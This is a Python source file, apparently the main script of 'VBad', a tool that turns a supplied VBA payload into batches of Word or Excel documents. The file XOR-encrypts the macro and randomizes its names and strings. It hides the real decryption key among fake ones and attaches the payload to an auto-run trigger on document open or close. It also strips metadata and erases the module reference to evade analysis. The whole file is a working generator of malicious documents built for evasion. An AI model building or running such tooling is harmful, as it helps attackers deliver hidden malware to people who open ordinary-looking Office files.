import sys
sys.dont_write_bytecode = True
import win32com.client, os
from const import *
from inc.classes import *
from ctypes import *
from _winreg import *

def return_file_type(template_file):
    if os.path.isfile(template_file) == False:
        raise Info(template_file + " was not found.", 0)

    filename, file_extension = os.path.splitext(template_file)
    if file_extension == ".doc" or file_extension == ".xls":
        Info(file_extension + " detected", 0, 0)
        return file_extension
    else:
        raise Info(file_extension +" is not a supported extension.", 0)
    return Container


def open_file(filepath, right):
    try:
        open_file = open(filepath, right)
    except:
        Info(filepath+ " was not found, please check if the path is correct and/or read access",3)
    return open_file


def file_len(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

def main():

    print '''
    __     ______            _ 
    \ \   / / __ )  __ _  __| |
     \ \ / /|  _ \ / _` |/ _` |
      \ V / | |_) | (_| | (_| |
       \_/  |____/ \__,_|\__,_|
       
            VBA Obfuscation Tools combined with an MS office document generator
            By @Pepitoh
    '''

    file_type = return_file_type(template_file)
    worksheet_name = ""
    cell_location = ""
    filenames = open_file(filename_list, "r")
    Info("Valid filename_list, "+str(file_len(filename_list)) +" "+file_type+" will be generated", 0, 0)
    vb = open_file(original_vba_file, "r")
    vba_str = vb.read()
    Info(original_vba_file+ " will be obfuscated and integrated in created documents", 0, 0)


    for filename in filenames:
        #Opening and working with office document.
        filename = filename.rstrip('\n\r')
        Info("Creating "+filename + file_type, 0,1)

        if file_type == ".doc":
            Office_container = WordObject()
        elif file_type == ".xls":
            worksheet_name = random_value(5,string.ascii_letters)
            cell_location = random_value(1, string.ascii_uppercase) + random_value(2, string.digits)
            Info("Name of the hidden sheet: "+ worksheet_name, 0, 3)
            Info("Location of the cell: "+ cell_location, 0, 3)
            Office_container = ExcelObject(worksheet_name, cell_location) 
        
        if encryption_type == "xor":
            Info("XOR encrypton was selected", 0, 2)
            vba = Enc_VBA_XOR(vba_str, trigger_function_name, file_type, worksheet_name, cell_location)
        else:
            raise Info(encryption_type+ " is not supported yet, feel free to code it :-)",3)

        Info("Randomizing variable and function names", 0, 2)
        vba.randomize_var()

        Info("Obfuscation of strings", 0, 2)
        vba.obfuscate_string()

        Info("Hiding strings from python script",0,2)
        vba.hide_string()
        
        Office_container.Open(template_file)
        if file_type == ".xls" : Office_container.CreateNewTab()
        VBA_Func = VBA_Functions(file_type, worksheet_name, cell_location)
        #Adding keys :
        if key_hiding_method == "variable":
            if add_fake_keys:
                #The keys are stored in the doc and are sorted alphabetically with their name
                #Small keys are stored at the beggining (using a-v as first letter) in order to hide the location of the real key in the doc
                #Long keys (containing real key) are stored in random places (using Random names)
                Info("Adding " +str(small_keys)+ " fake small keys before real ones",0,2)
                for z in range(small_keys):
                    random_var_name_first = random_value(2, string.ascii_letters)
                    Office_container.AddVba(VBA_Func.generate_generic_store_function("Activate_fake_Key_before", random_value(1, 'abcdfeghijklmnoprstuv') + random_value(random.randint(3,10), string.ascii_letters), random_value(random.randint(3,10), string.ascii_letters)), random_var_name_first)
                    Office_container.RunMacro("Activate_fake_Key_before")
                    Office_container.DeleteVbaModule(random_var_name_first)    

                Info("Adding "+str(big_keys)+" fake big keys",0,2)
                for k in range(big_keys):
                    random_vba_name = random_value(1, string.ascii_letters)
                    Office_container.AddVba(VBA_Func.generate_generic_store_function("Activate_fake_Key_after", random_value(1, 'abcdfeghijklmnoprstuv') +  random_value(random.randint(3,10), string.ascii_letters), random_value(encryption_key_length - random.randint(0,100))), random_vba_name)
                    Office_container.RunMacro("Activate_fake_Key_after")
                    Office_container.DeleteVbaModule(random_vba_name)         
                    
            Info("Using Document.Variables method for hiding ciphering keys (real ones)",0,2)
            Office_container.AddVba(VBA_Func.generate_generic_store_function("ActivateKey", vba.key_name, vba.key), "k")
            Office_container.RunMacro("ActivateKey")
            Office_container.DeleteVbaModule("k")

            if auto_function_macro == "onClose":
                Info("onClose auto-action was chosen, add trick to bypass first closing of the document : ",0,2)
                Office_container.AddVba(VBA_Func.generate_generic_store_function("OncloseKey", trigger_close_test_name, trigger_close_test_value), "tmp5")
                Office_container.RunMacro("OncloseKey")
                Office_container.DeleteVbaModule("tmp5")
                #Wrapping function

            elif auto_function_macro == "onOpen":
                Info("onOpen auto-action was chosen ",0,2)
            else:
                raise Info(auto_function_macro+ " is not supported yet, feel free to code it :-)",3)

            Info("Wrapping triggering function with auto_function_macro", 0,2)
            triggered_vba = Office_container.generate_trigger_function(vba, auto_function_macro)

            Info("Removing VBA style",0,2)
            triggered_vba = VBA_Func.remove_style(triggered_vba)
            final_vba_nostyle = VBA_Func.remove_style(vba.getCurrentVba())

            Info("Adding effective payload to a specific module and triggering function to the file",0,2)
            random_module_name = random_value(7, string.ascii_letters)
            Office_container.AddVba(final_vba_nostyle,random_module_name)
            Office_container.AddVba(triggered_vba)

            Info("Removing all metadatas from file", 0,2)
            Office_container.Remove_Metadata()

            Info("Saving file", 0,2)
            Office_container.Save(path_gen_files + "\\" + filename, file_type)

        else:
            raise Info(key_hiding_method+ " is not supported yet, feel free to code it :-)",3)


        
        Office_container.Close()
        Office_container.Quit()
        del Office_container
        del vba

        if (delete_module_name):
            Info("Option delete module name activated, deleted reference to module containing effective payload",0,2)
            with open(path_gen_files + "\\" + filename+file_type, "rb") as input_file: 
                content = input_file.read()
                if "Module="+random_module_name in content:
                    content = content.replace("Module="+random_module_name, "\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d" )
            with open(path_gen_files + "\\" + filename+file_type, "wb" ) as f:
                f.write(content)        
        
        Info("File "+filename + file_type+" was created succesfuly",1,1)                     

    print "\n"
    Info("Good, everything seems ok, "+str(file_len(filename_list)) +" "+file_type+" files were created in "+path_gen_files+" using "+encryption_type+" encyption with "+key_hiding_method+" hiding technic", 1,0)

if __name__ == "__main__": main()
#xc
